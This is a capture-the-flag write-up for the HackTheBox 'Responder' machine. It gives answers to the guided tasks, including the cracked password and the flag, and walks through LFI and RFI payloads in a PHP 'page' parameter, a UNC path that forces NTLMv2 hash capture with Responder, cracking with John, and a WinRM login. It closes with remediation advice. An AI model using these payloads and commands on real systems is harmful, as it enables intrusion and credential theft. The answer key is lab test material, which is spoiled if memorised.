# HackTheBox — Responder

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-green)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Points](https://img.shields.io/badge/XP-150-yellow)
![Rating](https://img.shields.io/badge/Rating-4.5%2F5-brightgreen)

---

## Overview

| Field | Details |
|-------|---------|
| Machine Name | Responder |
| Difficulty | Very Easy |
| OS | Windows |
| IP Address | 10.129.95.234 |
| Key Techniques | LFI, RFI, LLMNR Poisoning, NTLMv2 Hash Capture, Hash Cracking, WinRM |
| Tools Used | Nmap, Responder, John the Ripper, Evil-WinRM |

---

## Task Answers

Before jumping into the walkthrough, here are the answers to all the guided tasks HTB asks during this machine:

| Task | Question | Answer |
|------|----------|--------|
| Task 1 | When visiting the web service using the IP address, what is the domain that we are being redirected to? | `unika.htb` |
| Task 2 | Which scripting language is being used on the server to generate webpages? | `PHP` |
| Task 3 | What is the name of the URL parameter which is used to load different language versions of the webpage? | `page` |
| Task 4 | Which value for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability? | `../../../../../../../../windows/system32/drivers/etc/hosts` |
| Task 5 | Which value for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability? | `//10.10.14.6/somefile` |
| Task 6 | What does NTLM stand for? | `New Technology LAN Manager` |
| Task 7 | Which flag do we use in the Responder utility to specify the network interface? | `-I` |
| Task 8 | There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords. One such tool is often referred to as `john`, but the full name is what? | `John the Ripper` |
| Task 9 | What is the password for the administrator user? | `badminton` |
| Task 10 | We'll use a Windows service to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? | `5985` |
| Task 11 | On which user's desktop is the flag located? | `mike` |

---

## Enumeration

### Step 1 — Host Discovery

Started with a ping to confirm the target was alive and identify the OS from the TTL value.

```bash
ping 10.129.95.234
```

```
64 bytes from 10.129.95.234: icmp_seq=1 ttl=127 time=726 ms
64 bytes from 10.129.95.234: icmp_seq=2 ttl=127 time=546 ms
```

**TTL = 127 → Windows machine** (Linux TTL = 64, Windows TTL = 128, slightly decremented due to routing hops)

---

### Step 2 — Port Scanning

Ran an Nmap service and script scan to identify open ports.

```bash
sudo nmap -sV -sC 10.129.95.234
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Unika
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows
```

**Key findings:**
- **Port 80** — Apache web server running **PHP 8.1.1** (answers Task 2)
- **Port 5985** — WinRM (Windows Remote Management) — our entry point after getting credentials

---

## Web Enumeration

### Step 3 — Accessing the Web Application

Visited the target IP in the browser. The web application redirected to `unika.htb` (answers Task 1). Since this domain wasn't in our local DNS, the page failed to load.

**Fix — added the domain to /etc/hosts:**

```bash
sudo nano /etc/hosts
```

Added this line:
```
10.129.95.234 unika.htb
```

After saving, the website loaded — a web design company called **UNIKA**.

---

### Step 4 — Discovering the Vulnerability

While exploring the site, noticed the language selector in the top navigation bar showing **EN**, **FR**, **DE** options.

Clicked the **DE** (German) option and observed the URL changed to:

```
http://unika.htb/index.php?page=german.html
```

**The `page` parameter is used to load different language versions of the webpage** (answers Task 3).

This is immediately suspicious — the parameter appears to load files directly from disk.

---

### Step 5 — Confirming LFI (Local File Inclusion)

Tested whether the `page` parameter is vulnerable to LFI by attempting to traverse directories and read a sensitive Windows file:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The **Windows hosts file content was returned in the browser** — LFI confirmed (answers Task 4).

This tells us:
- User input is passed directly to a PHP `include()` function
- No input sanitization is in place
- We can read any file the web server has access to

---

## Exploitation

### Step 6 — Understanding the RFI Attack Path

The `page` parameter also supports **Remote File Inclusion (RFI)** — loading files from external sources using UNC paths.

**RFI example:**
```
http://unika.htb/index.php?page=//10.10.14.6/somefile
```
(answers Task 5)

When the Windows server tries to access a UNC path (network share), it automatically attempts **NTLM authentication** with the machine at that IP address. This is where Responder comes in.

**NTLM = New Technology LAN Manager** (answers Task 6) — Microsoft's authentication protocol used across Windows environments.

---

### Step 7 — Setting Up Responder

First, identified the tun0 interface IP address (our VPN address):

```bash
ifconfig
```

```
tun0: inet 10.10.14.19
```

Started Responder on the **tun0** interface using the **-I** flag (answers Task 7):

```bash
sudo responder -I tun0 -wF
```

Responder started with all servers active:
```
[+] Listening for events...
SMB server    [ON]
Kerberos      [ON]
SQL server    [ON]
FTP server    [ON]
LDAP server   [ON]
RDP server    [ON]
WinRM server  [ON]
```

---

### Step 8 — Triggering the NTLMv2 Hash Capture

With Responder listening, triggered the RFI by navigating to our attacker IP via UNC path:

```
http://unika.htb/index.php?page=//10.10.14.19/sharefilehtb
```

The error message confirmed the server tried to access our share:
```
Warning: include(\\10.10.14.19\SHAREFILEHTB): Failed to open stream: 
Permission denied in C:\xampp\htdocs\index.php on line 11
```

**Responder captured the NTLMv2 hash:**

```
[SMB] NTLMv2-SSP Client   : 10.129.62.74
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:[FULL HASH]
```

**Why this works:**
When a Windows machine tries to access a network share that doesn't exist in DNS, it broadcasts an LLMNR request asking "who owns this hostname?" Responder intercepts that broadcast, responds "I'm here", and the victim machine sends its NTLMv2 challenge/response hash to authenticate. We capture that hash without ever touching the actual machine.

---

## Hash Cracking

### Step 9 — Cracking the NTLMv2 Hash

Saved the captured hash to a file and cracked it using **John the Ripper** (full name answers Task 8) with the rockyou wordlist:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

```
badminton        (Administrator)
1g 0:00:00:00 DONE
Session completed.
```

**Administrator password = `badminton`** (answers Task 9)

---

## Remote Access

### Step 10 — Connecting via WinRM

From our Nmap scan, port **5985** is open — this is WinRM (Windows Remote Management), a Windows service for remote administration (answers Task 10).

Connected using Evil-WinRM with the cracked credentials:

```bash
evil-winrm -i 10.129.62.74 -u Administrator -p badminton
```

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Full PowerShell session obtained as Administrator.

---

## Flag

### Step 11 — Finding the Flag

Navigated the filesystem to find the flag:

```powershell
cd C:\
ls
cd Users
ls
```

Found two users: **Administrator** and **mike**

```powershell
cd mike
ls
cd Desktop
ls
cat flag.txt
```

**Flag located on mike's desktop** (answers Task 11):

```
ea81b7afddd03efaa0945333ed147fac
```

---

## Full Attack Chain

```
Target: 10.129.95.234 (Windows — TTL 127)
         ↓
Nmap → Port 80 (Apache/PHP) + Port 5985 (WinRM)
         ↓
Web app redirects to unika.htb
→ Added to /etc/hosts
         ↓
Language selector found → ?page= parameter
→ Loads files directly (PHP include)
         ↓
LFI confirmed:
?page=../../../../windows/system32/drivers/etc/hosts
         ↓
RFI triggered:
?page=//10.10.14.19/sharefilehtb
         ↓
Responder (-I tun0) captures NTLMv2 hash
→ RESPONDER\Administrator
         ↓
John the Ripper cracks hash
→ Password: badminton
         ↓
Evil-WinRM → Port 5985
→ Administrator shell
         ↓
C:\Users\mike\Desktop\flag.txt
→ Flag captured
```

---

## Key Concepts Learned

### LFI vs RFI

| Type | Description | Example |
|------|-------------|---------|
| LFI (Local File Inclusion) | Read files already on the server | `?page=../../../../windows/system32/drivers/etc/hosts` |
| RFI (Remote File Inclusion) | Load files from external source | `?page=//ATTACKER_IP/share` |

### NTLM vs NTLMv2

| Hash Type | Usage |
|-----------|-------|
| NTLM | Can be used directly in Pass-the-Hash attacks via Evil-WinRM |
| NTLMv2 | Challenge-response hash — must be cracked offline first, then use plaintext password |

### Why Responder Works

Windows falls back to LLMNR (Link-Local Multicast Name Resolution) when DNS fails. Responder listens for these broadcasts, responds as the requested host, and captures the NTLMv2 authentication attempt. The `-I` flag specifies which network interface to listen on.

---

## Real World Impact

In a real penetration testing engagement, this attack chain would lead to significantly deeper compromise:

```
Captured NTLMv2 hash → Pass-the-Hash across network
Valid Administrator credentials → Mimikatz (dump LSASS)
All cached domain credentials → BloodHound mapping
Kerberoasting attack paths → Service account compromise
Domain Controller access → Full domain compromise
DCSync → Dump all domain hashes
```

A single misconfigured PHP `include()` function with no input validation led to full Administrator access — demonstrating why input sanitization and disabling LLMNR are critical security controls.

---

## Remediation Recommendations

| Finding | Risk | Fix |
|---------|------|-----|
| LFI/RFI via page parameter | Critical | Validate and sanitize all user input, use whitelists for allowed files |
| LLMNR enabled | High | Disable LLMNR via Group Policy |
| Weak Administrator password | High | Enforce strong password policy |
| WinRM exposed | Medium | Restrict WinRM access to authorized IPs only |

---

## Tools Used

| Tool | Command | Purpose |
|------|---------|---------|
| Nmap | `sudo nmap -sV -sC TARGET` | Port and service enumeration |
| Responder | `sudo responder -I tun0 -wF` | LLMNR poisoning and NTLMv2 capture |
| John the Ripper | `john hash -w=/usr/share/wordlists/rockyou.txt` | Offline hash cracking |
| Evil-WinRM | `evil-winrm -i TARGET -u Administrator -p badminton` | Remote PowerShell via WinRM |

---

*Written by Saif (sakata6666) | HTB CPTS Path | August 2026*

*All testing performed on authorized HackTheBox lab infrastructure only*
